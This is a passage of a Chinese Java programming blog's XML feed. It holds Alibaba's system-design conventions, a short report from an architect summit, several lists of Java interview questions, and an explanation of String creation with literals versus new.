      <link href="/2025/10/30/%E8%A7%84%E8%8C%83/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E5%88%B6%E5%AE%9A%E4%BA%86%E8%BF%99%2016%20%E6%9D%A1%E8%AE%BE%E8%AE%A1%E8%A7%84%E7%BA%A6%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A7%84%E8%8C%83/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E5%88%B6%E5%AE%9A%E4%BA%86%E8%BF%99%2016%20%E6%9D%A1%E8%AE%BE%E8%AE%A1%E8%A7%84%E7%BA%A6%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h5 id="1、【强制】存储方案和底层数据结构的设计获得评审一致通过，并沉淀成为文档。"><a href="#1、【强制】存储方案和底层数据结构的设计获得评审一致通过，并沉淀成为文档。" class="headerlink" title="1、【强制】存储方案和底层数据结构的设计获得评审一致通过，并沉淀成为文档。"></a>1、【强制】存储方案和底层数据结构的设计获得评审一致通过，并沉淀成为文档。</h5><p>说明：有缺陷的底层数据结构容易导致系统风险上升，可扩展性下降，重构成本也会因历史数据迁移和系统平滑过渡而陡然增加，所以，存储方案和数据结构需要认真地进行设计和评审，生产环境提交执行后，需要进行 double check。</p><p>正例：评审内容包括存储介质选型、表结构设计能否满足技术方案、存取性能和存储空间能否满足业务发展、表或字段之间的辩证关系、字段名称、字段类型、索引等；数据结构变更（如在原有表中新增字段）也需要进行评审通过后上线。</p><h5 id="2、【强制】在需求分析阶段，如果与系统交互的-User-超过一类并且相关的-User-Case-超过-5-个，使用用例图来表达更加清晰的结构化需求。"><a href="#2、【强制】在需求分析阶段，如果与系统交互的-User-超过一类并且相关的-User-Case-超过-5-个，使用用例图来表达更加清晰的结构化需求。" class="headerlink" title="2、【强制】在需求分析阶段，如果与系统交互的 User 超过一类并且相关的 User Case 超过 5 个，使用用例图来表达更加清晰的结构化需求。"></a>2、【强制】在需求分析阶段，如果与系统交互的 User 超过一类并且相关的 User Case 超过 5 个，使用用例图来表达更加清晰的结构化需求。</h5><h5 id="3、【强制】如果某个业务对象的状态超过-3-个，使用状态图来表达并且明确状态变化的各个触发条件。"><a href="#3、【强制】如果某个业务对象的状态超过-3-个，使用状态图来表达并且明确状态变化的各个触发条件。" class="headerlink" title="3、【强制】如果某个业务对象的状态超过 3 个，使用状态图来表达并且明确状态变化的各个触发条件。"></a>3、【强制】如果某个业务对象的状态超过 3 个，使用状态图来表达并且明确状态变化的各个触发条件。</h5><p>说明：状态图的核心是对象状态，首先明确对象有多少种状态，然后明确两两状态之间是否存在直接转换关系，再明确触发状态转换的条件是什么。</p><p>正例：淘宝订单状态有已下单、待付款、已付款、待发货、已发货、已收货等。比如已下单与已收货这两种状态之间是不可能有直接转换关系的。</p><h5 id="4、【强制】如果系统中某个功能的调用链路上的涉及对象超过-3-个，使用时序图来表达并且明确各调用环节的输入与输出。"><a href="#4、【强制】如果系统中某个功能的调用链路上的涉及对象超过-3-个，使用时序图来表达并且明确各调用环节的输入与输出。" class="headerlink" title="4、【强制】如果系统中某个功能的调用链路上的涉及对象超过 3 个，使用时序图来表达并且明确各调用环节的输入与输出。"></a>4、【强制】如果系统中某个功能的调用链路上的涉及对象超过 3 个，使用时序图来表达并且明确各调用环节的输入与输出。</h5><p>说明：时序图反映了一系列对象间的交互与协作关系，清晰立体地反映系统的调用纵深链路。</p><h5 id="5、【强制】如果系统中模型类超过-5-个，并且存在复杂的依赖关系，使用类图来表达并且明确类之间的关系。"><a href="#5、【强制】如果系统中模型类超过-5-个，并且存在复杂的依赖关系，使用类图来表达并且明确类之间的关系。" class="headerlink" title="5、【强制】如果系统中模型类超过 5 个，并且存在复杂的依赖关系，使用类图来表达并且明确类之间的关系。"></a>5、【强制】如果系统中模型类超过 5 个，并且存在复杂的依赖关系，使用类图来表达并且明确类之间的关系。</h5><p>说明：类图像建筑领域的施工图，如果搭平房，可能不需要，但如果建造蚂蚁 Z 空间大楼，肯定需要详细的施工图。</p><h5 id="6、【强制】如果系统中超过-2-个对象之间存在协作关系，并且需要表示复杂的处理流程，使用活动图来表示。"><a href="#6、【强制】如果系统中超过-2-个对象之间存在协作关系，并且需要表示复杂的处理流程，使用活动图来表示。" class="headerlink" title="6、【强制】如果系统中超过 2 个对象之间存在协作关系，并且需要表示复杂的处理流程，使用活动图来表示。"></a>6、【强制】如果系统中超过 2 个对象之间存在协作关系，并且需要表示复杂的处理流程，使用活动图来表示。</h5><p>说明：活动图是流程图的扩展，增加了能够体现协作关系的对象泳道，支持表示并发等。</p><h5 id="7、【推荐】需求分析与系统设计在考虑主干功能的同时，需要充分评估异常流程与业务边界。"><a href="#7、【推荐】需求分析与系统设计在考虑主干功能的同时，需要充分评估异常流程与业务边界。" class="headerlink" title="7、【推荐】需求分析与系统设计在考虑主干功能的同时，需要充分评估异常流程与业务边界。"></a>7、【推荐】需求分析与系统设计在考虑主干功能的同时，需要充分评估异常流程与业务边界。</h5><p>反例：用户在淘宝付款过程中，银行扣款成功，发送给用户扣款成功短信，但是支付宝入款时由于断网演练产生异常，淘宝订单页面依然显示未付款，导致用户投诉。</p><h5 id="8、【推荐】类在设计与实现时要符合单一原则。"><a href="#8、【推荐】类在设计与实现时要符合单一原则。" class="headerlink" title="8、【推荐】类在设计与实现时要符合单一原则。"></a>8、【推荐】类在设计与实现时要符合单一原则。</h5><p>说明：单一原则最易理解却是最难实现的一条规则，随着系统演进，很多时候，忘记了类设计的初衷。</p><h5 id="9、【推荐】谨慎使用继承的方式来进行扩展，优先使用聚合-组合的方式来实现。"><a href="#9、【推荐】谨慎使用继承的方式来进行扩展，优先使用聚合-组合的方式来实现。" class="headerlink" title="9、【推荐】谨慎使用继承的方式来进行扩展，优先使用聚合&#x2F;组合的方式来实现。"></a>9、【推荐】谨慎使用继承的方式来进行扩展，优先使用聚合&#x2F;组合的方式来实现。</h5><p>说明：不得已使用继承的话，必须符合里氏代换原则，此原则说父类能够出现的地方子类一定能够出现，比如，“把钱交出来”，钱的子类美元、欧元、人民币等都可以出现。</p><h5 id="10、【推荐】系统设计时，根据依赖倒置原则，尽量依赖抽象类与接口，有利于扩展与维护。"><a href="#10、【推荐】系统设计时，根据依赖倒置原则，尽量依赖抽象类与接口，有利于扩展与维护。" class="headerlink" title="10、【推荐】系统设计时，根据依赖倒置原则，尽量依赖抽象类与接口，有利于扩展与维护。"></a>10、【推荐】系统设计时，根据依赖倒置原则，尽量依赖抽象类与接口，有利于扩展与维护。</h5><p>说明：低层次模块依赖于高层次模块的抽象，方便系统间的解耦。</p><h5 id="11、【推荐】系统设计时，注意对扩展开放，对修改闭合。"><a href="#11、【推荐】系统设计时，注意对扩展开放，对修改闭合。" class="headerlink" title="11、【推荐】系统设计时，注意对扩展开放，对修改闭合。"></a>11、【推荐】系统设计时，注意对扩展开放，对修改闭合。</h5><p>说明：极端情况下，交付的代码都是不可修改的，同一业务域内的需求变化，通过模块或类的扩展来实现。</p><h5 id="12、【推荐】系统设计阶段，共性业务或公共行为抽取出来公共模块、公共配置、公共类、公共方法等，避免出现重复代码或重复配置的情况。"><a href="#12、【推荐】系统设计阶段，共性业务或公共行为抽取出来公共模块、公共配置、公共类、公共方法等，避免出现重复代码或重复配置的情况。" class="headerlink" title="12、【推荐】系统设计阶段，共性业务或公共行为抽取出来公共模块、公共配置、公共类、公共方法等，避免出现重复代码或重复配置的情况。"></a>12、【推荐】系统设计阶段，共性业务或公共行为抽取出来公共模块、公共配置、公共类、公共方法等，避免出现重复代码或重复配置的情况。</h5><p>说明：随着代码的重复次数不断增加，维护成本指数级上升。</p><h5 id="13、【推荐】避免如下误解：敏捷开发-讲故事-编码-发布。"><a href="#13、【推荐】避免如下误解：敏捷开发-讲故事-编码-发布。" class="headerlink" title="13、【推荐】避免如下误解：敏捷开发 &#x3D; 讲故事 + 编码 + 发布。"></a>13、【推荐】避免如下误解：敏捷开发 &#x3D; 讲故事 + 编码 + 发布。</h5><p>说明：敏捷开发是快速交付迭代可用的系统，省略多余的设计方案，摒弃传统的审批流程，但核心关键点上的必要设计和文档沉淀是需要的。</p><p>反例：某团队为了业务快速发展，敏捷成了产品经理催进度的借口，系统中均是勉强能运行但像面条一样的代码，可维护性和可扩展性极差，一年之后，不得不进行大规模重构，得不偿失。</p><h5 id="14、【参考】系统设计主要目的是明确需求、理顺逻辑、后期维护，次要目的用于指导编码。"><a href="#14、【参考】系统设计主要目的是明确需求、理顺逻辑、后期维护，次要目的用于指导编码。" class="headerlink" title="14、【参考】系统设计主要目的是明确需求、理顺逻辑、后期维护，次要目的用于指导编码。"></a>14、【参考】系统设计主要目的是明确需求、理顺逻辑、后期维护，次要目的用于指导编码。</h5><p>说明：避免为了设计而设计，系统设计文档有助于后期的系统维护，所以设计结果需要进行分类归档保存。</p><h5 id="15、【参考】设计的本质就是识别和表达系统难点，找到系统的变化点，并隔离变化点。"><a href="#15、【参考】设计的本质就是识别和表达系统难点，找到系统的变化点，并隔离变化点。" class="headerlink" title="15、【参考】设计的本质就是识别和表达系统难点，找到系统的变化点，并隔离变化点。"></a>15、【参考】设计的本质就是识别和表达系统难点，找到系统的变化点，并隔离变化点。</h5><p>说明：世间众多设计模式目的是相同的，即隔离系统变化点。</p><h5 id="16、【参考】系统架构设计的目的："><a href="#16、【参考】系统架构设计的目的：" class="headerlink" title="16、【参考】系统架构设计的目的："></a>16、【参考】系统架构设计的目的：</h5><ul><li>确定系统边界。确定系统在技术层面上的做与不做。</li><li>确定系统内模块之间的关系。确定模块之间的依赖关系及模块的宏观输入与输出。</li><li>确定指导后续设计与演化的原则。使后续的子系统或模块设计在规定的框架内继续演化。</li><li>确定非功能性需求。非功能性需求是指安全性、可用性、可扩展性等。</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 规范 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《全球架构师峰会》参会回来，想和大家分享下</title>
      <link href="/2025/10/30/%E8%B5%84%E6%96%99/%E3%80%8A%E5%85%A8%E7%90%83%E6%9E%B6%E6%9E%84%E5%B8%88%E5%B3%B0%E4%BC%9A%E3%80%8B%E5%8F%82%E4%BC%9A%E5%9B%9E%E6%9D%A5%EF%BC%8C%E6%83%B3%E5%92%8C%E5%A4%A7%E5%AE%B6%E5%88%86%E4%BA%AB%E4%B8%8B/"/>
      <url>/2025/10/30/%E8%B5%84%E6%96%99/%E3%80%8A%E5%85%A8%E7%90%83%E6%9E%B6%E6%9E%84%E5%B8%88%E5%B3%B0%E4%BC%9A%E3%80%8B%E5%8F%82%E4%BC%9A%E5%9B%9E%E6%9D%A5%EF%BC%8C%E6%83%B3%E5%92%8C%E5%A4%A7%E5%AE%B6%E5%88%86%E4%BA%AB%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<p>这两天（07.06 - 07.07）参加了 InfoQ 在深圳举办的 2018《全球架构师峰会》，它号称是一个面向高端技术管理者、架构师的技术会议，50 % 参会者拥有 8 年以上工作经验。从往期回顾看来，已经在深圳、北京一共举办了 5 场峰会。</p><p><img src="http://img.javastack.cn/WechatIMG634.jpeg" alt="image"></p><p>说实话，我也是第一次参加这么高端大气上档次的峰会，如果现在要我来总结这两天的会议，只能用一片空白来形容了，会议太多，也比较杂乱。。主要包括微服务、深度和机器学习、人工智能、大数据、架构、区块链、金融、视频直播、产品研发等等。但同一时间只能听一场，所以只能选择性的听。</p><p>首先参加这个峰会的门票是不便宜的，两天下来要 6 千多不说，还有的是要坐飞机、请假过来参加的。花了大笔钱和时间，最重要的是要所收获的，不然怎么向公司领导交待成果？怎么向技术同事吹牛逼你这两天学到的东西？如果是个人，不学到一点东西，你怎么对得起你交的这大几千块钱、时间等等，毕竟这不是一笔小钱。</p><p><img src="http://img.javastack.cn/WechatIMG638.jpeg" alt="image"></p><p>东西太多，记住的不多，后续翻下 PPT 好好回顾一下吧！累了，不多说了，全程拍了图，需要的回复 “AS2018” 获取吧。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10 道腾讯的 Java 面试题</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/10%20%E9%81%93%E8%85%BE%E8%AE%AF%E7%9A%84%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/10%20%E9%81%93%E8%85%BE%E8%AE%AF%E7%9A%84%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>下面总结10道面试腾讯的Java面试题。</p><p>1、说几种常见的攻击方式及预防手段。</p><p>2、http1.x和http2.x的区别。</p><p>3、mysql查询语句怎么做性能分析。</p><p>4、你知道哪几种排序算法？</p><p>5、HashMap和HashTable的区别，并说明其底层实现数据结构。</p><p>6、HashMap满了之后怎么扩容？</p><p>7、Linux中远程传输文件有什么方式？</p><p>8、说说Java中异常的分类。</p><p>9、TCP和UDP的区别，TCP为什么是三次握手，不是两次。</p><p>10、说说数据库设计的三范式，可以违反三范式吗？</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18 道 Java 基础面试笔试题</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/18%20%E9%81%93%20Java%20%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AF%95%E9%A2%98/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/18%20%E9%81%93%20Java%20%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-28/77524659.jpg"></p><p>1.你最常上的两个技术站和最常使用的两个app分別进什么？主要解决你什么需求？</p><p>2.请简述http协议中get请求和post请求的区别.</p><p>3.请简述session和cookie的区別.</p><p>4.简述Servlet与JSP的关系，</p><p>5.JSP内置对象有哪些，各自起到的作用</p><p>6.简述你所理解的JAVA封装、继承、多态。</p><p>7.写出2个常用的设计模式(伪代码)，并简述应用场景。</p><p>8.HashMap和HashTable区别。</p><p>9.HashSet和TreeSet的区别。</p><p>10.ArrayList和LinkedList的区别。</p><p>11.&#x3D;&#x3D;与equals的区别。</p><p>12.简述泛型、反射、注解应用场景及各自解决了哪些问题。</p><p>13.Thread类的方法有哪些，如何多种方式实现线程同步。</p><p>14进程与线程的区别，JAVA中有哪些方式可以创建线程。</p><p>15.现有一学生表结构(student-id,class-id,name)，请写出统计每班有多少学生的SQL语句。</p><p>16.假如你正在开发一个系统的登录程序，请简述你是如何实现记住用户名和密码这个操作的，并如何实现？</p><p>17.在视图层不支持存储cookie，服务端不支持session的场景下如何保持用户登陆状态。</p><p>18.设计一套CMS系统或者博客系统的表结构（画出大概的UML图即可）。</p><p>本试题来源于微信群友分享，没有标准答案哦。工作多年的攻城狮们，不知道你们还能不能全部做得上来，都来试试吧。小编到时候也会做一份参考答案出来发到微信群里。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>75 道 BAJT 中高级 Java 面试题，你能答上几道？</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/75%20%E9%81%93%20BAJT%20%E4%B8%AD%E9%AB%98%E7%BA%A7%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%8C%E4%BD%A0%E8%83%BD%E7%AD%94%E4%B8%8A%E5%87%A0%E9%81%93%EF%BC%9F/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/75%20%E9%81%93%20BAJT%20%E4%B8%AD%E9%AB%98%E7%BA%A7%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%8C%E4%BD%A0%E8%83%BD%E7%AD%94%E4%B8%8A%E5%87%A0%E9%81%93%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>整理了下 BATJ 关于 JAVA 的面试题目，大家参考下吧，希望对大家有所帮助，可以帮大家查漏不缺。答对这些面试题，PASS 掉 80 % 的求职竞争者。</p><h2 id="75-道-BATJ-中高级-Java-面试题"><a href="#75-道-BATJ-中高级-Java-面试题" class="headerlink" title="75 道 BATJ 中高级 Java 面试题"></a>75 道 BATJ 中高级 Java 面试题</h2><ol><li>   hashcode相等两个类一定相等吗?equals呢?相反呢?</li><li>   介绍一下集合框架?</li><li>   hashmap hastable 底层实现什么区别?hashtable和concurrenthashtable呢?</li><li>   hashmap和treemap什么区别?低层数据结构是什么?</li><li>   线程池用过吗都有什么参数?底层如何实现的?</li><li>   sychnized和Lock什么区别?sychnize 什么情况情况是对象锁? 什么时候是全局锁为什么?</li><li>   ThreadLocal 是什么底层如何实现?写一个例子呗?</li><li>   volitile的工作原理?</li><li>   cas知道吗如何实现的?</li><li>   请用至少四种写法写一个单例模式?<br>小试牛刀，答对几道？</li><li>   请介绍一下JVM内存模型??用过什么垃圾回收器都说说呗</li><li>   线上发送频繁full gc如何处理? CPU 使用率过高怎么办?</li><li>   如何定位问题?如何解决说一下解决思路和处理方法</li><li>   知道字节码吗?字节码都有哪些?Integer x &#x3D;5,int y &#x3D;5，比较x &#x3D;y 都经过哪些步骤?</li><li>   讲讲类加载机制呗都有哪些类加载器，这些类加载器都加载哪些文件?</li><li>   手写一下类加载Demo</li><li>   知道osgi吗? 他是如何实现的???</li><li>   请问你做过哪些JVM优化?使用什么方法达到什么效果???</li><li>   classforName(“java.lang.String”)和String classgetClassLoader() LoadClass(“java.lang.String”) 什么区别啊?</li><li>   探查Tomcat的运行机制即框架？</li><li>   分析Tomcat线程模型？</li><li>   Tomcat系统参数认识和调优？</li><li>   MySQL底层B+Tree机制？</li><li>   SQL执行计划详解？</li><li>   索引优化详解？</li><li>   SQL语句如如如何优化？</li><li>   spring都有哪些机制啊AOP底层如何实现的啊IOC呢??</li><li>   cgLib知道吗?他和jdk动态代理什么区别?手写一个jdk动态代理呗?</li><li>   使用mysq1索引都有哪些原则? ?索引什么数据结构? 3+tree 和B tree 什么区别?</li><li>   MySQL有哪些存储引擎啊?都有啥区别? 要详细!</li><li>   设计高并发系统数据库层面该怎么设计??数据库锁有哪些类型?如何实现呀?</li><li>   数据库事务有哪些?</li><li>   如何设计可以动态扩容缩容的分库分表方案?</li><li>   用过哪些分库分表中间件，有啥优点和缺点?讲一下你了解的分库分表中间件的底层实现原理?</li><li>   我现在有一个未分库分表的系统，以后系统需分库分表，如何设计，让未分库分表的系统动态切换到分库分表的系统上?TCC? 那若出现网络原因，网络连不通怎么办啊?</li><li>   分布式事务知道吗? 你们怎么解决的?</li><li>   为什么要分库分表啊?</li><li>   RPC通信原理，分布式通信原理                          </li><li>   分布式寻址方式都有哪些算法知道一致性hash吗?手写一下java实现代码??你若userId取摸分片，那我要查一段连续时间里的数据怎么办???</li><li>   如何解决分库分表主键问题有什么实现方案??</li><li>   redis和memcheched 什么区别为什么单线程的redis比多线程的memched效率要高啊?</li><li>   redis有什么数据类型都在哪些场景下使用啊?</li><li>   reids的主从复制是怎么实现的redis的集群模式是如何实现的呢redis的key是如何寻址的啊?</li><li>   使用redis如何设计分布式锁?使用zk可以吗?如何实现啊这两种哪个效率更高啊??</li><li>   知道redis的持久化吗都有什么缺点优点啊? ?具体底层实现呢?</li><li>   redis过期策略都有哪些LRU 写一下java版本的代码吧??</li><li>   说一下dubbo的实现过程注册中心挂了可以继续通信吗??</li><li>   dubbo支持哪些序列化协议?hessian 说一下hessian的数据结构PB知道吗为啥PB效率是最高的啊??</li><li>   知道netty吗’netty可以干嘛呀NIO,BIO,AIO 都是什么啊有什么区别啊?</li><li>   dubbo复制均衡策略和高可用策略都有哪些啊动态代理策略呢?</li><li>   为什么要进行系统拆分啊拆分不用dubbo可以吗’dubbo和thrift什么区别啊?</li><li>   为什么使用消息队列啊消息队列有什么优点和缺点啊?</li><li>   如何保证消息队列的高可用啊如何保证消息不被重复消费啊</li><li>   kafka ，activemq,rabbitmq ，rocketmq都有什么优点，缺点啊???</li><li>   如果让你写一个消息队列，该如何进行架构设计啊?说一下你的思路</li><li>   说一下TCP ‘IP四层?</li><li>   http的工作流程?? ?http1.0 http1.1http2.0 具体哪些区别啊?</li><li>   TCP三次握手，四层分手的工作流程画一下流程图为什么不是四次五次或者二次啊?</li><li>   画一下https的工作流程?具体如何实现啊?如何防止被抓包啊??</li><li>   源码中所用到的经典设计思想及常用设计模式</li><li>   系统架构如何选择合适日志技术（log4j、log4j2、slf4j、jcl…….）                  </li><li>   springAOP的原理，springAOP和Aspectj的关系，springAOP的源码问题</li><li>   dubbo框架的底层通信原理</li><li>   RPC通信原理，分布式通信原理</li><li>   如何利用springCloud来架构微服务项目</li><li>   如何正确使用docker技术</li><li>   springMVC的底层原理、如何从源码来分析其原理</li><li>   mybaits的底层实现原理，如何从源码来分析mybaits</li><li>   mysql的索引原理，索引是怎么实现的</li><li>   索引的底层算法、如何正确使用、优化索引</li><li>   springboot如何快速构建系统</li><li>   zk原理知道吗zk都可以干什么Paxos算法知道吗?说一下原理和实现?</li><li>   如果让你写一个消息队列，该如何进行架构设计啊?说一下你的思路</li><li>   分布式事务知道吗? 你们怎么解决的?</li><li>   请问你做过哪些JVM优化?使用什么方法达到什么效果?</li></ol><hr><p>讲真的，你能答上多少道？</p><p>希望大家在每天闲暇之余学习其中几道题目，日积月累，去 BAJT 面试时，一切都水到渠成。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中创建 String 的两道面试题及详解</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/Java%20%E4%B8%AD%E5%88%9B%E5%BB%BA%20String%20%E7%9A%84%E4%B8%A4%E9%81%93%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/Java%20%E4%B8%AD%E5%88%9B%E5%BB%BA%20String%20%E7%9A%84%E4%B8%A4%E9%81%93%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>我们知道创建一个String类型的变量一般有以下两种方法：</p><pre class="line-numbers language-none"><code class="language-none">String str1 &#x3D; &quot;abcd&quot;;String str2 &#x3D; new String(&quot;abcd&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么为什么会存在这两种创建方式呢，它们在内存中的表现形式各有什么区别？</p><p>下面来看下面两道经常遇到的面试题。</p><h5 id="面试题1："><a href="#面试题1：" class="headerlink" title="面试题1："></a>面试题1：</h5><pre class="line-numbers language-none"><code class="language-none">String a &#x3D; &quot;abcd&quot;;String b &#x3D; &quot;abcd&quot;;System.out.println(a &#x3D;&#x3D; b);  &#x2F;&#x2F; trueSystem.out.println(a.equals(b)); &#x2F;&#x2F; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：</p><p>用””创建的a,b两个字符串，&#x3D;&#x3D;和equals比较返回都为true，这是因为a,b都指向了方法区的同一个字符串。所以，当同样的一个字符串用””重复创建时只在方法区创建一次。</p><h5 id="面试题2："><a href="#面试题2：" class="headerlink" title="面试题2："></a>面试题2：</h5><pre class="line-numbers language-none"><code class="language-none">String c &#x3D; new String(&quot;abcd&quot;);String d &#x3D; new String(&quot;abcd&quot;);System.out.println(c &#x3D;&#x3D; d);  &#x2F;&#x2F; falseSystem.out.println(c.equals(d)); &#x2F;&#x2F; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：</p><p>用new创建的c,d两个字符串，equals为true很简单因为equals永远比较的是值，而&#x3D;&#x3D;为false说明两个字符串的引用不一样。用new创建的字符串每次都会在JVM堆中创建，所以c,d都对应堆中的两个不同的字符串。</p><p>关于这两道题中的””和new创建的字符串在内存中的表现形式可以看下图就明白了。</p><p><img src="https://www.programcreek.com/wp-content/uploads/2014/03/constructor-vs-double-quotes-Java-String-New-Page-650x324.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 面试题经典 77 问！</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%E7%BB%8F%E5%85%B8%2077%20%E9%97%AE%EF%BC%81/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%E7%BB%8F%E5%85%B8%2077%20%E9%97%AE%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-3-23/2058162.jpg"></p><p>金三银四了，3月底，4月初，找工作换单位的黄金时期。4月初将会有有一大批职场人士流动。。。</p><p>作为Java开发码农的你是不是也在蠢蠢欲动，或者已经搞了几轮车轮战了？</p><p><strong>我们为大家准备了 77 道经典 Java 面试题，如果你面试不力，基础还不够强，那么你或许会受用！</strong></p><p>1、什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？</p><p>2、JDK和JRE的区别是什么？</p><p>3、static关键字是什么意思？Java中是否可以覆盖(override)一个private或者是 static的方法？</p><p>4、是否可以在static环境中访问非static变量？</p><p>5、Java支持的数据类型有哪些？什么是自动拆装箱？</p><p>6、Java中的方法覆盖(Overriding)和方法重载(Overloading)是什么意思？</p><p>7、Java中，什么是构造函数？什么是构造函数重载？什么是复制构造函数？</p><p>8、Java支持多继承么？</p><p>9、接口和抽象类的区别是什么？</p><p>10、什么是值传递和引用传递？</p><p>11、进程和线程的区别是什么？</p><p>12、创建线程有几种不同的方式？你喜欢哪一种？为什么？</p><p>13、概括的解释下线程的几种可用状态。</p><p>14、同步方法和同步代码块的区别是什么？</p><p>15、什么是死锁(deadlock)？</p><p>16、如何确保N个线程可以访问N个资源同时又不导致死锁？</p><p>17、Java集合类框架的基本接口有哪些？</p><p>18、为什么集合类没有实现Cloneable和Serializable接口？</p><p>19、什么是迭代器(Iterator)？</p><p>20、Iterator和ListIterator的区别是什么？</p><p>21、快速失败(fail-­fast)和安全失败(fail-­safe)的区别是什么？</p><p>22、Java中的HashMap的工作原理是什么？</p><p>23、hashCode()和equals()方法的重要性体现在什么地方？</p><p>24.HashMap和Hashtable有什么区别？</p><p>25、数组(Array)和列表(ArrayList)有什么区别？什么时候应该使用Array而不是 ArrayList？</p><p>26、ArrayList和LinkedList有什么区别？</p><p>27、Comparable和Comparator接口是干什么的？列出它们的区别。</p><p>28、什么是Java优先级队列(Priority Queue)？</p><p>29、你了解大O符号(big-­O notation)么？你能给出不同数据结构的例子么？</p><p>30、如何权衡是使用无序的数组还是有序的数组？</p><p>31、Java集合类框架的最佳实践有哪些？</p><p>32、Enumeration接口和Iterator接口的区别有哪些？</p><p>33、HashSet和TreeSet有什么区别？</p><p>34、System.gc()和Runtime.gc()会做什么事情？</p><p>35、finalize()方法什么时候被调用？析构函数(finalization)的目的是什么？</p><p>36、果对象的引用被置为null，垃圾收集器是否会立即释放对象占用的内存？</p><p>37、Java堆的结构是什么样子的？什么是堆中的永久代(Perm Gen space)?</p><p>38、串行(serial)收集器和吞吐量(throughput)收集器的区别是什么？</p><p>39、在Java中，对象什么时候可以被垃圾回收？</p><p>40、JVM的永久代中会发生垃圾回收么？</p><p>41、Java中的两种异常类型是什么？他们有什么区别？</p><p>42、Java中Exception和Error有什么区别？</p><p>43、throw和throws有什么区别？</p><p>44、异常处理完成以后，Exception对象会发生什么变化？</p><p>45、finally代码块和finalize()方法有什么区别？</p><p>46、什么是JDBC？</p><p>47、解释下驱动(Driver)在JDBC中的角色。</p><p>48、Class.forName()方法有什么作用？</p><p>49、PreparedStatement比Statement有什么优势？</p><p>50、什么时候使用CallableStatement？用来准备CallableStatement的方法是什么？</p><p>51、数据库连接池是什么意思？</p><p>52、什么是RMI？</p><p>53、什么是分布式垃圾回收(DGC)？它是如何工作的？</p><p>54、解释下Serialization和Deserialization。</p><p>55、什么是Servlet？</p><p>56、说一下Servlet的体系结构。</p><p>57、GenericServlet和HttpServlet有什么区别？</p><p>58、解释下Servlet的生命周期。</p><p>59、doGet()方法和doPost()方法有什么区别？</p><p>60、什么是服务端包含(Server Side Include)？</p><p>61、什么是Servlet链(Servlet Chaining)？</p><p>62、如何知道是哪一个客户端的机器正在请求你的Servlet？</p><p>63、HTTP响应的结构是怎么样的？</p><p>64、什么是cookie？session和cookie有什么区别？</p><p>65、浏览器和Servlet通信使用的是什么协议？</p><p>66、什么是HTTP隧道？</p><p>67、sendRedirect()和forward()方法有什么区别？</p><p>68、什么是URL编码和URL解码？</p><p>69、JSP请求是如何被处理的？</p><p>70、什么是JSP指令(Directive)？JSP中有哪些不同类型的指令？</p><p>71、什么是JSP动作(JSP action)？</p><p>72、隐含对象是什么意思？有哪些隐含对象？</p><p>73、面向对象软件开发的优点有哪些？</p><p>74、封装的定义和好处有哪些？</p><p>75、多态的定义？</p><p>76、继承的定义？</p><p>77、抽象的定义？抽象和封装的不同点？</p><hr>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
